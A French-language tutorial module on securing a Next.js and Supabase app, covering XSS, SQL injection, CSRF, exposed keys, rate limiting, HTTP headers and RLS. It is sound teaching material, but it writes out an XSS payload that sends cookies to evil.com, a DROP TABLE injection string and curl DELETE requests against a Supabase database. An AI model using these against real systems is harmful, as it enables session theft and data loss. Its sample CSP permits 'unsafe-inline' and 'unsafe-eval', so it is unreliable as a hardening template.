`Couche T — Tooling Avancé`

# Sécurité web

> Comprendre et protéger une application Next.js + Supabase contre les failles classiques du web.

**Prérequis :** `C3-01` `C4-01` `C4-02` `C5-01`

**Ce que tu vas apprendre :**
- Les 7 failles les plus courantes et comment s'en protéger
- Comment configurer les headers de sécurité HTTP dans Next.js
- Comment activer et configurer RLS sur Supabase

---

## 🟦 Carte d'identité

**Définition simple :**
> Imagine que ton site est une maison. La sécurité web, c'est 
> fermer les portes, les fenêtres, et vérifier qui entre. 
> Chaque faille (XSS, injection, CSRF...) est une porte ou 
> une fenêtre que tu as oubliée ouverte. Un attaquant n'a 
> besoin que d'une seule porte ouverte pour entrer.

**Rôle technique :**
> La sécurité web couvre toutes les protections entre ton 
> utilisateur, ton application et ta base de données. Elle 
> commence au navigateur (XSS, CSRF), passe par le serveur 
> (validation, headers, rate limiting) et finit à la base 
> de données (injection SQL, RLS).

**Schéma** :
📸 à ajouter dans docs/

**Les 7 failles à connaître :**
| Faille | Cible | Gravité | Module lié |
|--------|-------|---------|------------|
| XSS (Cross-Site Scripting) | Navigateur | Critique | C3-03 |
| Injection SQL | Base de données | Critique | C4-01 |
| CSRF (Cross-Site Request Forgery) | Formulaires | Haute | C4-02 |
| Clés API exposées | Code source | Critique | C5-01 |
| Absence de rate limiting | API | Haute | C4-02 |
| Headers HTTP manquants | Serveur | Moyenne | C1-02 |
| RLS désactivé (Supabase) | Base de données | Critique | C4-01 |

---

## 🟩 Sous le capot

**Mécanisme — Les couches de sécurité :**
> 1. **Navigateur** — Protection XSS (React échappe par défaut)
> 2. **Transport** — HTTPS chiffre les données en transit (C1-04)
> 3. **Serveur** — Validation des entrées, headers de sécurité
> 4. **API** — Authentification, rate limiting, CORS
> 5. **Base de données** — RLS, requêtes paramétrées
> 6. **Secrets** — Variables d'environnement correctement séparées

---

### Faille 1 — XSS (Cross-Site Scripting)

**Le problème :**
> Un attaquant injecte du JavaScript dans ta page via un champ 
> de formulaire ou un paramètre d'URL. Le script s'exécute 
> dans le navigateur de tous les visiteurs.

**Exemple d'attaque :**
```
URL : https://ton-site.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

**Protection :**
```tsx
// React échappe automatiquement le contenu des variables
// ✅ SAFE — React échappe automatiquement
<p>{userInput}</p>

// ❌ DANGEREUX — ne jamais faire ça avec des données utilisateur
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

---

### Faille 2 — Injection SQL

**Le problème :**
> Un attaquant envoie du SQL malveillant dans un champ de formulaire 
> pour lire, modifier ou supprimer les données de ta base.

**Exemple d'attaque :**
```
Input : ' OR 1=1; DROP TABLE users; --
```

**Protection :**
```ts
// ✅ SAFE — Supabase utilise des requêtes paramétrées
const { data } = await supabase
  .from('modules')
  .select('*')
  .eq('code', userInput);  // userInput est échappé automatiquement

// ❌ DANGEREUX — ne jamais concaténer du SQL brut
const { data } = await supabase.rpc('raw_query', {
  sql: `SELECT * FROM modules WHERE code = '${userInput}'`
});
```

---

### Faille 3 — CSRF (Cross-Site Request Forgery)

**Le problème :**
> Un site malveillant envoie une requête à ton API en utilisant 
> les cookies de l'utilisateur connecté. L'API croit que c'est 
> l'utilisateur légitime.

**Protection :**
```ts
// Vérifier l'origin de la requête dans les API routes
export async function POST(request: Request) {
  const origin = request.headers.get('origin');
  const allowedOrigins = ['https://eticlab.vercel.app'];
  
  if (!allowedOrigins.includes(origin || '')) {
    return new Response('Forbidden', { status: 403 });
  }
  // ... traitement
}
```

---

### Faille 4 — Clés API exposées

**Le problème :**
> Les variables `NEXT_PUBLIC_*` sont dans le bundle JavaScript 
> client. Tout le monde peut les lire dans le code source.

**Protection :**
```bash
# ✅ SAFE — côté serveur uniquement (pas dans le navigateur)
SUPABASE_SERVICE_ROLE_KEY=sk_secret_xxxx

# ⚠️ PUBLIC — visible par tous, protégé par RLS
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGci...

# ❌ DANGEREUX — secret exposé côté client
NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_xxxx
```

**Règle simple :**
| Type de clé | Préfixe | Où l'utiliser |
|------------|---------|---------------|
| Clé publique (anon, publishable) | `NEXT_PUBLIC_` | Partout |
| Clé secrète (service_role, secret) | Sans préfixe | API routes uniquement |

---

### Faille 5 — Absence de rate limiting

**Le problème :**
> Sans limitation, un attaquant peut envoyer des milliers 
> de requêtes par seconde à ton API (brute force, DDoS, 
> coût explosif sur les API IA payantes).

**Protection :**
```ts
// Exemple simple avec un Map en mémoire
// Pour la prod, utiliser Upstash Redis ou Vercel KV
const rateLimit = new Map<string, { count: number; reset: number }>();

export async function POST(request: Request) {
  const ip = request.headers.get('x-forwarded-for') || 'unknown';
  const now = Date.now();
  const window = 60_000; // 1 minute
  const limit = 10; // 10 requêtes par minute

  const entry = rateLimit.get(ip);
  if (entry && now < entry.reset) {
    if (entry.count >= limit) {
      return new Response('Too Many Requests', { status: 429 });
    }
    entry.count++;
  } else {
    rateLimit.set(ip, { count: 1, reset: now + window });
  }

  // ... traitement normal
}
```

---

### Faille 6 — Headers HTTP de sécurité

**Le problème :**
> Sans les bons headers, les navigateurs n'activent pas 
> certaines protections (clickjacking, sniffing, XSS...).

**Protection dans Next.js :**
```js
// next.config.js
const securityHeaders = [
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff',  // empêche le MIME sniffing
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY',  // empêche le clickjacking (iframe)
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block',  // protection XSS navigateur
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin',
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload',  // HSTS
  },
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';",
  },
];

module.exports = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }];
  },
};
```

**Vérifier les headers :**
```bash
curl -I https://eticlab.vercel.app
# Chercher : X-Content-Type-Options, X-Frame-Options, 
# Strict-Transport-Security, Content-Security-Policy
```

---

### Faille 7 — RLS désactivé (Supabase)

**Le problème :**
> Sans RLS, la clé anon (publique) donne accès à TOUTES 
> les données de ta table. N'importe qui peut lire, modifier, 
> supprimer via un simple curl.

**Protection :**
```sql
-- Activer RLS sur chaque table
ALTER TABLE modules ENABLE ROW LEVEL SECURITY;

-- Lecture publique
CREATE POLICY "lecture_publique" ON modules
  FOR SELECT USING (true);

-- Écriture réservée aux utilisateurs authentifiés
CREATE POLICY "ecriture_authentifiee" ON modules
  FOR INSERT WITH CHECK (auth.role() = 'authenticated');

-- Modification réservée au propriétaire
CREATE POLICY "modification_proprietaire" ON modules
  FOR UPDATE USING (auth.uid() = user_id);

-- Suppression réservée au propriétaire
CREATE POLICY "suppression_proprietaire" ON modules
  FOR DELETE USING (auth.uid() = user_id);
```

**Vérifier le RLS :**
```sql
-- Dans le SQL Editor de Supabase
SELECT tablename, rowsecurity 
FROM pg_tables 
WHERE schemaname = 'public';
-- Si rowsecurity = false → DANGER
```

---

## 🟥 Laboratoire de test

**POC 1 — Audit des headers de sécurité :**
```bash
# Vérifier les headers de ton site
curl -I https://eticlab.vercel.app

# Outil en ligne : securityheaders.com
# Colle ton URL → note de A à F
```

**POC 2 — Vérifier les clés exposées :**
```bash
# Chercher dans le code source
grep -r "NEXT_PUBLIC_" .env*
grep -r "sk_live\|sk_test\|service_role" .

# Chercher dans le build
grep -r "service_role\|secret" .next/static/ 2>/dev/null
```

**POC 3 — Tester le RLS Supabase :**
```bash
# Essayer d'accéder aux données avec la clé anon
curl "https://[URL].supabase.co/rest/v1/modules?select=*" \
  -H "apikey: [ANON_KEY]"

# Essayer de supprimer (devrait échouer si RLS est actif)
curl -X DELETE "https://[URL].supabase.co/rest/v1/modules?id=eq.1" \
  -H "apikey: [ANON_KEY]"
```

**POC 4 — Tester le rate limiting :**
```bash
# Envoyer 20 requêtes rapidement
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    http://localhost:3000/api/modules
done
# Les dernières devraient retourner 429
```

**Commande clé à retenir :**
```bash
curl -I https://ton-site.vercel.app | grep -i "x-content\|x-frame\|strict-transport\|content-security"
```

---

## 💀 Zone de hack

**Vulnérabilité classique — chaîne d'attaques :**
> Les failles ne sont pas isolées. Un attaquant combine :
> 1. XSS pour voler un cookie de session
> 2. CSRF pour exécuter des actions au nom de l'utilisateur
> 3. Clé API exposée pour accéder directement à la base
> → La sécurité est une chaîne : un seul maillon faible suffit.

**Simulation — Audit de sécurité complet :**
```bash
# 1. Vérifier les headers
curl -I https://ton-site.vercel.app

# 2. Chercher les clés exposées
curl -s https://ton-site.vercel.app | grep -i "key\|secret\|token"

# 3. Vérifier les API publiques
curl https://ton-site.vercel.app/api/modules

# 4. Tester le RLS Supabase
curl -X DELETE "https://[URL].supabase.co/rest/v1/modules?id=gt.0" \
  -H "apikey: [ANON_KEY]"
```

**Contre-mesure — Checklist avant chaque déploiement :**
> - [ ] Aucun secret dans les variables `NEXT_PUBLIC_`
> - [ ] RLS activé sur toutes les tables Supabase
> - [ ] Headers de sécurité configurés dans next.config.js
> - [ ] Validation des entrées sur toutes les API routes
> - [ ] Rate limiting sur les routes sensibles (API IA, auth)
> - [ ] npm audit sans vulnérabilités critiques

---

## 🔄 Alternatives

| Outil | Gratuit | Open Source | Freemium | Premium | Limites |
|-------|---------|-------------|----------|---------|---------|
| npm audit | ✅ | ✅ | — | — | Dépendances npm uniquement |
| OWASP ZAP | ✅ | ✅ | — | — | Scanner de vulnérabilités, complexe |
| Snyk | ✅ | — | ✅ | ✅ | Scan dépendances + code, 200 tests/mois gratuits |
| Dependabot (GitHub) | ✅ | — | — | — | PRs automatiques pour dépendances vulnérables |
| securityheaders.com | ✅ | — | — | — | Audit headers en ligne, simple |
| Checkmarx | — | — | — | ✅ | Entreprise, SAST/DAST complet, cher |
| SonarCloud | ✅ | — | ✅ | ✅ | Qualité + sécurité du code |

> **Recommandation EticLab :** npm audit (gratuit, intégré) + 
> Dependabot (gratuit sur GitHub, activé par défaut) + 
> securityheaders.com pour vérifier les headers. OWASP ZAP 
> pour un audit plus poussé quand le site est en production.

---

## ✅ Checklist de validation

- [ ] Est-ce que je sais expliquer XSS, injection SQL et CSRF ?
- [ ] Est-ce que je sais configurer les headers de sécurité dans Next.js ?
- [ ] Est-ce que je sais activer RLS et créer des policies sur Supabase ?
- [ ] Est-ce que je sais séparer les clés publiques des clés secrètes ?

---

## 🧰 Toolbox

| Outil | Usage | Prix | Risque |
|-------|-------|------|--------|
| npm audit | Scanner les vulnérabilités npm | Gratuit | Faux positifs |
| Dependabot | PRs auto pour dépendances vulnérables | Gratuit (GitHub) | Bruit |
| securityheaders.com | Vérifier les headers HTTP | Gratuit | Aucun |
| OWASP ZAP | Scanner de vulnérabilités web | Gratuit, open source | Complexe |
| Snyk | Scan dépendances + code | Freemium | Aucun |

---

## 📚 Aller plus loin

- [OWASP Top 10 — les 10 failles les plus critiques](https://owasp.org/www-project-top-ten/)
- [Next.js — Security documentation](https://nextjs.org/docs/app/building-your-application/configuring/content-security-policy)
- [Supabase — Row Level Security](https://supabase.com/docs/guides/database/postgres/row-level-security)

## Liens avec d'autres modules
- → C1-04-ssl : HTTPS chiffre le transport
- → C3-03-composants-ui : React échappe le XSS par défaut
- → C4-01-supabase : RLS protège la base de données
- → C4-02-api : validation et rate limiting sur les API routes
- → C5-01-vercel : variables d'environnement et headers
